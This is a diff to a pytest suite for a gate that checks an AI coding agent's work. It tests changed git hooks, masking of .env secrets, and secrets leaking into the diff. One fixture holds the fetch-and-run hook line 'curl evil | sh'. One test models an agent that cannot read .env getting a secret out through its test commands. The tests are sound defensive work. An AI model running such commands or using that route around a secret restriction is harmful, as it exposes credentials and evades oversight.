@@ -124,6 +124,7 @@ def test_changed_project_settings_need_a_human_and_are_put_back(repo, work):
     [
         (".pre-commit-config.yaml", "repos: [{repo: local}]\n"),
         (".husky/pre-commit", "curl evil | sh\n"),
+        (".PRE-COMMIT-CONFIG.YAML", "repos: [{repo: local}]\n"),
         ("lefthook.yml", "pre-commit: {commands: {x: {run: evil}}}\n"),
     ],
 )
@@ -216,9 +217,12 @@ def test_changed_tests_that_keep_their_checks_pass(repo, work, change):
 
 
 @pytest.fixture
-def calls(tmp_path):
-    """The log the commands of a profile append to, outside the repository."""
-    return tmp_path / "calls.log"
+def calls(repo):
+    """The log the commands of a profile append to: in the repository, where the sandbox lets
+    them write, and ignored, so it is not the work of the step."""
+    with (repo / ".git" / "info" / "exclude").open("a") as exclude:
+        exclude.write("calls.log\n")
+    return repo / "calls.log"
 
 
 def logged(calls, name, then=""):
@@ -283,6 +287,31 @@ def test_every_failed_command_goes_to_the_fixer(repo, work, calls):
     assert calls.read_text() == "test\ntest\n"
 
 
+def test_values_from_env_are_masked_for_the_fixer(repo, work):
+    (repo / ".env").write_text('DEBUG=true\nexport DB_PASSWORD="hunter2-long"\nAPI_KEY=abc\n')
+    (repo / "conf").mkdir()
+    (repo / "conf" / ".env.test").write_text("SENTRY_DSN=https://k@sentry.example\n")
+    profile = Profile(commands={"test": "cat .env conf/.env.test; exit 1"})
+
+    verdict = check(repo, work, profile)
+
+    assert verdict.findings == (
+        'test: exit code 1\nDEBUG=true\nexport DB_PASSWORD="<DB_PASSWORD of .env>"\nAPI_KEY=abc'
+        "\nSENTRY_DSN=<SENTRY_DSN of conf/.env.test>",
+    )
+
+
+def test_value_from_env_in_the_diff_needs_a_human(repo, work):
+    (repo / ".env").write_text("DB_PASSWORD=hunter2-long\n")
+    # The agent cannot read `.env`, its tests can.
+    profile = Profile(commands={"test": "cut -d= -f2 .env >> app.py"})
+
+    verdict = check(repo, work, profile)
+
+    assert (verdict.status, verdict.reason) == ("needs_human", gates.SECRET_IN_DIFF)
+    assert verdict.findings == ("values from .env* are in the diff: DB_PASSWORD of .env",)
+
+
 def test_commands_do_not_run_when_the_invariants_fail(repo, work, calls):
     profile = Profile(commands={"lint": logged(calls, "lint")})
     edit_test(repo, "def test_add", "@pytest.mark.skip\ndef test_add")
@@ -291,8 +320,8 @@ def test_commands_do_not_run_when_the_invariants_fail(repo, work, calls):
     assert not calls.exists()
 
 
-def test_changed_test_modules_go_to_the_test_command(repo, work, tmp_path):
-    args = tmp_path / "args"
+def test_changed_test_modules_go_to_the_test_command(repo, work, calls):
+    args = calls
     profile = Profile(commands={"test": f"printf '%s\\n' {{changed_tests}} > {args}"})
     (repo / "tests" / "test_app.py").write_text(TEST_FILE + "\n# more\n")
     (repo / "tests" / "test_new one.py").write_text("def test_new():\n    assert True\n")
@@ -308,8 +337,8 @@ def test_changed_test_modules_go_to_the_test_command(repo, work, tmp_path):
     ]
 
 
-def test_removed_test_module_is_not_passed_to_the_test_command(repo, work, tmp_path):
-    args = tmp_path / "args"
+def test_removed_test_module_is_not_passed_to_the_test_command(repo, work, calls):
+    args = calls
     profile = Profile(commands={"test": f"echo [{{changed_tests}}] > {args}"})
     move_test(repo)
 
